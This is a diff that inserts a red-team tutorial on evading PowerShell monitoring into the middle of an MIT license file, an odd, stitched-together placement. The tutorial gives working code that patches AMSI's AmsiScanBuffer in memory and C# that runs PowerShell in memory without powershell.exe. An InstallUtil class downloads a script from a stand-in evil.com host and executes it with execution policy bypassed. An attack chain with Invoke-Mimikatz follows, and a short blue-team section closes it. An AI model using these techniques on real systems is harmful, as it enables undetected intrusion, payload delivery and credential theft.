@@ -8,7 +8,111 @@ in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
+Overview
+PowerShell is an incredibly powerful tool for post-exploitation—but it's also heavily monitored by AV/EDR solutions through logging mechanisms like:
 
+ScriptBlock Logging
+Module Logging
+Command Line Logging (Event ID 4688)
+AMSI (Antimalware Scan Interface)
+This module will cover how to bypass those detections and run PowerShell payloads covertly using both native obfuscation and real-world examples.
+
+1. Why PowerShell is Tracked
+Method	Monitored Through
+powershell.exe -enc ...	Command-line arguments
+IEX (Invoke-Expression)	ScriptBlock logging
+DownloadFile / WebClient	AMSI
+Therefore, executing PowerShell directly must involve obfuscation, in-memory techniques, and AMSI bypass.
+
+2. Evasion via Obfuscation
+Classic Base64 Obfuscation
+Example:
+
+powershell.exe -EncodedCommand aQBlAHgAIABbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdYWFhYWFg...'))
+Limitations:
+
+Easily decoded
+Triggers static YARA rules
+Detectable by AMSI
+3. Bypassing AMSI
+AMSI Patch in PowerShell
+This is a known method to bypass AMSI by modifying memory of amsi.dll in PowerShell’s process.
+
+$win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+  [DllImport("kernel32")]
+  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+  [DllImport("kernel32")]
+  public static extern IntPtr LoadLibrary(string name);
+  [DllImport("kernel32")]
+  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $win32
+$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+[UInt32]$old = 0
+[Win32]::VirtualProtect($ptr, [UIntPtr]5, 0x40, [Ref]$old)
+$bytes = [Byte[]] (0xB8,0x57,0x00,0x07,0x80)  # mov eax,0x80070057 (E_ACCESSDENIED)
+[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, 5)
+Result: AMSI is neutered. All future PowerShell commands will not be scanned.
+
+4. In-Memory Execution Without powershell.exe
+C# Reflective Execution of PowerShell Commands
+using System;
+using System.Management.Automation;
+using System.Collections.ObjectModel;
+
+class Program {
+    static void Main(string[] args) {
+        PowerShell ps = PowerShell.Create();
+        ps.AddScript("whoami; Get-Process | Out-File C:\\Temp\\procs.txt");
+        ps.Invoke();
+    }
+}
+Compile with:
+
+csc /r:System.Management.Automation.dll ps_injector.cs
+This avoids powershell.exe entirely, using the .NET System.Management.Automation assembly directly.
+
+5. Alternative: Living off the Land with InstallUtil.exe
+You can create a .NET executable that contains your PowerShell payload and execute it via InstallUtil.exe (a known LOLBIN) without detection.
+
+using System;
+using System.Management.Automation;
+using System.Configuration.Install;
+
+[System.ComponentModel.RunInstaller(true)]
+public class Evil : System.Configuration.Install.Installer {
+    public override void Uninstall(System.Collections.IDictionary savedState) {
+        PowerShell ps = PowerShell.Create();
+        ps.AddScript("Invoke-WebRequest -Uri http://evil.com/shell.ps1 -OutFile C:\\Temp\\evil.ps1; powershell -ExecutionPolicy Bypass -File C:\\Temp\\evil.ps1");
+        ps.Invoke();
+    }
+}
+Compile and run:
+
+csc /target:library /r:System.Management.Automation.dll evil.cs
+InstallUtil.exe /U evil.dll
+6. Real-World Attack Chain
+A Red Team engagement simulated:
+
+Dropping a .ps1 via LOLBAS (certutil)
+Patching AMSI
+Running obfuscated Invoke-Mimikatz from memory
+Using System.Net.WebClient inside .NET to avoid powershell.exe
+7. Recommendations for Blue Teams
+Monitor for .NET reflection using System.Management.Automation
+Set Group Policies to enforce Constrained Language Mode
+Enable AMSI + ScriptBlock logging
+Alert on excessive Base64 on command lines
+Summary
+Avoid command-line PowerShell
+Patch AMSI memory before running payloads
+Use reflection or .NET assemblies to execute PowerShell code in memory
+Combine LOLBINs like InstallUtil.exe or rundll32.exe for stealth
 The above copyright notice and this permission notice shall be included in all
 copies or substantial portions of the Software.
 
